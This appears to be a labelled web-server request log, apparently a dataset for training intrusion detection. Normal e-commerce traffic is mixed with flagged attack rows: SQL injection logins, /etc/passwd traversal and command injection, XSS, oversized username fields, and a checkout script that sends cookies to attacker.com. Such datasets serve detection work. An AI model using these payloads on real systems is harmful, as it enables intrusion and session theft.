+07:32:07.3,10.0.0.15,POST,/auth/login,"{'csrf_token': 'ImVl76QhkuMjQAQCTtx6GDlQK6F7PPwIUO2Egso3Rd'.gcqkGKKG.2yoVmHtJE5CIE_GB6Ei5wxMxsXxf, 'username': 'user39', 'password': '9AXTYfPPRFBy', 'submit': 'Log in'}",0
+07:32:09.1,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:32:11.0,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:32:13.3,192.168.1.182,GET,/auth/logout,,0
+07:32:15.1,127.0.0.1,GET,/order/myorders,,0
+07:32:17.6,192.168.1.50,GET,/auth/logout,,0
+07:32:19.2,10.0.0.79,GET,/auth/login,,0
+07:32:21.4,10.0.0.82,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:32:23.5,192.168.1.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:32:25.7,192.168.1.175,POST,/auth/login,"{'csrf_token': 'ImS8vxW8VtGv4nlV6MzX9EqtqhdgyojIGSCeKcUnPU'.7i0mMcSl.5jEJoJQu0vQZJj_u7Om1q2xZ0_Gm, 'username': 'user96', 'password': 'A8DJgMsQwmJ4', 'submit': 'Log in'}",0
+07:32:27.7,127.0.0.1,GET,/order/cart,,0
+07:32:29.0,192.168.1.197,POST,/auth/login,"{'csrf_token': 'ImAMRz4VKW5WzGV1WvqTx7Pl7bnnMr1EDQjF4enKx4'.SkNr5hdT.YjKXtJsSDpsYKpIfDWnb-lFonsk_, 'username': 'user54', 'password': '29l9GId*^^1C', 'submit': 'Log in'}",0
+07:32:31.3,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:32:33.0,192.168.1.50,POST,/auth/register,"{'csrf_token': 'ImOWKpf5YmN6vFhDefh9AX18LUJ0ET2m6yMyGftH9I'.09jdWUj6.s-1yP7eDcGQ4imBDAGyHEWqPeM50, 'username': 'newuser86', 'email': 'a62@b.com', 'password': '17LI@u)wAC!L', 'submit': 'Register'}",0
+07:32:35.1,192.168.1.197,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:32:37.4,127.0.0.1,GET,/auth/logout,,0
+07:32:39.0,192.168.1.50,GET,/auth/logout,,0
+07:32:41.0,10.0.0.195,GET,/auth/login,,0
+07:32:43.4,192.168.1.18,GET,/product/2,,0
+07:32:45.5,192.168.1.165,GET,/category/Iphone,,0
+07:32:47.0,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:32:49.4,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:32:51.0,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:32:53.6,192.168.1.56,POST,/auth/login,"{'csrf_token': 'ImNApMUVrBkSjHhkb49aq12Fd7MXadfPL98TtSpfz3'.MdatAFBZ.R9yAeUdhqjgqpqxHSL3Rgcwdob0H, 'username': 'user36', 'password': 'Z##CJ6gg#BnH', 'submit': 'Log in'}",0
+07:32:55.3,203.162.4.191,POST,/auth/register,"{'csrf_token': 'ImUHCaHZnsjarvYLpjU8fCvyr0fYAjpES5naOZ4zcd'.W4XP4Cbv.6IGUE47hDQIFPpDKUC713Lv0BNED, 'username': 'newuser71', 'email': 'a8@b.com', 'password': 'CWxQYKeQMU#M', 'submit': 'Register'}",0
+07:32:57.3,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:32:59.0,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:33:01.6,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:33:03.2,192.168.1.12,GET,/product/1,,0
+07:33:05.5,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:33:07.0,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:33:09.5,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:33:11.4,192.168.1.169,GET,/product/1,,0
+07:33:13.5,192.168.1.55,GET,/auth/login,,0
+07:33:14.8,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:33:16.8,192.168.1.50,GET,/order/myorders,,0
+07:33:18.8,10.0.0.15,POST,/auth/login,"{'csrf_token': 'ImZMwU94d4DVH28eAhiY4GqUFcfE96jYovS74i1R4p'.V9xW08zC.0RNspglM5OSvH_FoUTYgpWLfqjPY, 'username': 'user8', 'password': 'uiZ7@iW3jcvk', 'submit': 'Log in'}",0
+07:33:21.5,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:33:22.8,192.168.1.28,POST,/search,{'query': 'iphone 15 pro max'},0
+07:33:25.5,192.168.1.175,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:33:27.0,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:33:29.6,10.0.0.195,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:33:31.0,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:33:32.8,192.168.1.185,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:33:35.4,10.0.0.79,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:33:37.0,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:33:39.2,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:33:40.9,192.168.1.56,POST,/auth/login,"{'csrf_token': 'Im2O8LXhjiUD1XvP1rAuTc5sy8Qkyzz9ztanFvUnfa'.hEEvPyUX.8f8-GfIDGRRbHjnfYvJWGoTdmp6R, 'username': 'user36', 'password': 'Fuz9yOqyKP0o', 'submit': 'Log in'}",0
+07:33:43.7,192.168.1.165,POST,/search,{'query': 'iphone 15 pro max'},0
+07:33:45.2,192.168.1.28,GET,/product/2,,0
+07:33:46.9,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:33:49.4,192.168.1.162,GET,/product/2,,0
+07:33:51.7,192.168.1.18,GET,/,,0
+07:33:53.6,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:33:55.1,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:33:56.8,10.0.0.82,POST,/auth/register,"{'csrf_token': 'ImMavxVJOXOYryqQRwUQbXIsDU7W1fkipcPGFq7r43'.ZsCfe8nh.SvArzCSRcUJ2zZcj_bHXgqBghlz-, 'username': 'newuser30', 'email': 'a28@b.com', 'password': 'bKuBLPl(cirH', 'submit': 'Register'}",0
+07:33:58.9,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:34:00.8,10.0.0.15,POST,/search,{'query': 'iphone 15 pro max'},0
+07:34:03.5,10.0.0.79,GET,/product/1,,0
+07:34:05.1,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:34:07.6,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:34:08.8,10.0.0.176,GET,/product/1,,0
+07:34:11.2,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:34:12.8,192.168.1.167,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:34:15.5,192.168.1.162,POST,/search,{'query': 'iphone 15 pro max'},0
+07:34:16.9,192.168.1.165,GET,/order/myorders,,0
+07:34:18.8,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:34:21.4,10.0.0.66,POST,/auth/register,"{'csrf_token': 'ImkT7PcAdlxJtzzKL3u707Kg9xFsOvPU12myKfE7IG'.nx9MpK9W.SglcskfO5BBwqLcYiq85TU0awwSV, 'username': 'newuser26', 'email': 'a62@b.com', 'password': 'YNG0fXciPXfG', 'submit': 'Register'}",0
+07:34:23.2,192.168.1.50,GET,/product/2,,0
+07:34:24.8,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:34:27.5,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:34:28.8,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:34:31.2,192.168.1.169,GET,/product/1,,0
+07:34:33.3,192.168.1.185,POST,/search,{'query': 'iphone 15 pro max'},0
+07:34:35.3,127.0.0.1,GET,/product/2,,0
+07:34:37.5,10.0.0.82,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:34:39.0,10.0.0.195,GET,/auth/login,,0
+07:34:41.5,10.0.0.106,POST,/auth/login,"{'csrf_token': 'Imt1EWgwGhIDySQis6nYfWsF8GoAAlvI0w6Rnl5uUS'.tRJFbfZb.eZ2f3iz0kXQrnhdLc3Xss_zSPPtX, 'username': 'user51', 'password': 'UN)k0f*&FbEh', 'submit': 'Log in'}",0
+07:34:43.4,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:34:45.3,127.0.0.1,POST,/search,{'query': 'iphone 15 pro max'},0
+07:34:46.9,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:34:49.5,10.0.0.195,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:34:51.2,10.0.0.146,GET,/auth/register,,0
+07:34:53.7,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:34:54.9,10.0.0.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:34:57.6,10.0.0.106,POST,/search,{'query': 'iphone 15 pro max'},0
+07:34:59.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:35:01.0,203.162.4.191,GET,/category/Iphone,,0
+07:35:03.7,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:35:05.1,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:35:07.4,10.0.0.176,POST,/search,{'query': 'iphone 15 pro max'},0
+07:35:09.0,10.0.0.176,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:35:11.1,192.168.1.165,POST,/auth/login,"{'csrf_token': 'ImICrVQ6yd70TGNxZMDoBXZ2myYB3x4wLeu8zW2ifb'.66Dfs8NQ.9uxbxrLD8QWGGW2Mo8as6RUefW1n, 'username': 'user75', 'password': 'Owe*1YSHl!%0', 'submit': 'Log in'}",0
+07:35:12.9,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:35:15.3,10.0.0.82,GET,/order/cart,,0
+07:35:17.1,10.0.0.15,GET,/order/myorders,,0
+07:35:19.1,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:35:21.2,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:35:23.4,192.168.1.56,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:35:25.3,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:35:27.1,192.168.1.56,GET,/order/myorders,,0
+07:35:28.8,192.168.1.56,POST,/auth/login,"{'csrf_token': 'ImLHjpdwTIw64yz3X0CF0k6VJ3TVfqgW8gtrs88AW4'.D4bq5kZu.xaqQ8dZlYsigfUqPaho1iqHUPL36, 'username': 'user13', 'password': 'e$SpfmMdF8Wq', 'submit': 'Log in'}",0
+07:35:31.6,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:35:33.0,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:35:35.5,10.0.0.106,POST,/auth/login,"{'csrf_token': 'Ima9T67dxRaCk8OAVqSfG8okuljLL00PbSzL1VNTKT'.cS3fTtNR.MUPXMDVOyiPosGqEM6WxFFRJSQLU, 'username': 'user60', 'password': '8AIS6Me$@(A#', 'submit': 'Log in'}",0
+07:35:37.5,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:35:39.6,192.168.1.28,GET,/auth/register,,0
+07:35:41.7,10.0.0.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:35:43.4,10.0.0.28,GET,/product/1,,0
+07:35:45.0,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:35:47.1,192.168.1.50,POST,/auth/login,"{'csrf_token': 'ImaCHaWpLZn9Lx9pqrQgl31Zwilh5rHnqa24oAD9Je'.PWjuA6zK.e_6ci5BZh1vqw1cvwrmHR826hjqc, 'username': 'user84', 'password': 'lxH)^j#9If0S', 'submit': 'Log in'}",0
+07:35:49.3,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:35:51.3,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:35:53.3,192.168.1.18,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:35:55.3,192.168.1.151,GET,/auth/login,,0
+07:35:57.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:35:58.9,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:36:01.0,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:36:03.2,10.0.0.176,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:36:05.7,10.0.0.146,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:36:07.0,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:36:08.8,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:36:11.6,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:36:13.3,192.168.1.55,POST,/auth/login,"{'csrf_token': 'Im9oHXdmGfv57AFGFkRxXuvqs3ZsoA3p9BamoEYU24'.hUbL6wtB.seXhX_kRuV5djNggZcf14BE1KUSM, 'username': 'user22', 'password': 'Cu8c61HHK3Ez', 'submit': 'Log in'}",0
+07:36:15.7,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:36:17.7,192.168.1.46,GET,/order/myorders,,0
+07:36:19.7,192.168.1.18,POST,/auth/login,"{'csrf_token': 'ImM6el1H5k174oDqyA6hBLfYxrFtzsd0X2b1meNfNE'.vREJva69.GVZRPyZaG0xPOqR68NvjNI8Yv5LT, 'username': 'user91', 'password': 'C8WAFjagTRvv', 'submit': 'Log in'}",0
+07:36:21.0,127.0.0.1,GET,/auth/register,,0
+07:36:23.1,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:36:25.1,10.0.0.176,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:36:27.7,10.0.0.146,GET,/order/myorders,,0
+07:36:29.7,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:36:31.7,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:36:33.0,10.0.0.176,GET,/auth/logout,,0
+07:36:35.0,192.168.1.182,GET,/auth/register,,0
+07:36:36.9,192.168.1.50,GET,/auth/register,,0
+07:36:39.2,10.0.0.79,POST,/search,{'query': 'iphone 15 pro max'},0
+07:36:40.9,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:36:43.0,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:36:45.1,10.0.0.82,GET,/order/cart,,0
+07:36:47.3,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:36:48.8,192.168.1.12,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:36:51.5,10.0.0.176,GET,/order/myorders,,0
+07:36:53.2,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:36:54.9,192.168.1.197,POST,/search,{'query': 'iphone 15 pro max'},0
+07:36:57.1,192.168.1.197,POST,/search,{'query': 'iphone 15 pro max'},0
+07:36:59.1,192.168.1.182,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:37:01.3,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:37:03.6,203.162.4.191,GET,/,,0
+07:37:05.1,10.0.0.195,GET,/product/2,,0
+07:37:07.6,192.168.1.28,POST,/auth/register,"{'csrf_token': 'ImiBeLBD58FXexncwginnvVPf2VAPG0zha3VfT7O47'.PeN9bEc2.id2f7BnKFwd4GBOlB_kCy03HV5uN, 'username': 'newuser47', 'email': 'a56@b.com', 'password': 'yy@iimS)59s@', 'submit': 'Register'}",0
+07:37:09.0,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:37:11.7,192.168.1.56,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:37:13.4,10.0.0.67,POST,/search,{'query': 'iphone 15 pro max'},0
+07:37:14.9,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:37:17.0,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:37:18.8,10.0.0.28,GET,/product/1,,0
+07:37:21.3,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:37:22.8,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:37:25.4,192.168.1.151,POST,/auth/register,"{'csrf_token': 'Im96UoIN9tQVodEw53d4kvMH0hnCBvP7el8BpWl0Ax'.ClnW8VOG.6cZFdzBfgIxGrR_NE8iaeZcx6_6e, 'username': 'newuser50', 'email': 'a54@b.com', 'password': 'G)AIlBi@q^oP', 'submit': 'Register'}",0
+07:37:27.3,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:37:29.2,192.168.1.22,POST,/auth/register,"{'csrf_token': 'Im81IBRS0Fwjgn6IcS9PEDH93BFAYSm00yhia5Tg2h'.Mkij0BLC.SvkjAMF3XbaSORKKMF2z1Nk16Tzs, 'username': 'newuser78', 'email': 'a88@b.com', 'password': '14E4TkrzknS1', 'submit': 'Register'}",0
+07:37:31.5,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:37:33.7,10.0.0.195,GET,/auth/logout,,0
+07:37:35.6,192.168.1.55,POST,/search,{'query': 'iphone 15 pro max'},0
+07:37:37.7,192.168.1.182,GET,/order/myorders,,0
+07:37:39.3,203.162.4.191,GET,/auth/register,,0
+07:37:40.9,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:37:42.9,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:37:44.8,192.168.1.28,GET,/auth/login,,0
+07:37:47.6,203.162.4.190,GET,/order/myorders,,0
+07:37:49.2,192.168.1.175,GET,/,,0
+07:37:51.4,10.0.0.67,GET,/auth/register,,0
+07:37:53.0,192.168.1.56,POST,/auth/register,"{'csrf_token': 'ImcxiCbZb3sRw9SalTLiFukCpJVBV9cUSIW0Vu8NHR'.h5kK5VmI.qCRaTdIdCegq8VklfVvJPnN61Myp, 'username': 'newuser81', 'email': 'a81@b.com', 'password': 'HuS@*LwRLOTw', 'submit': 'Register'}",0
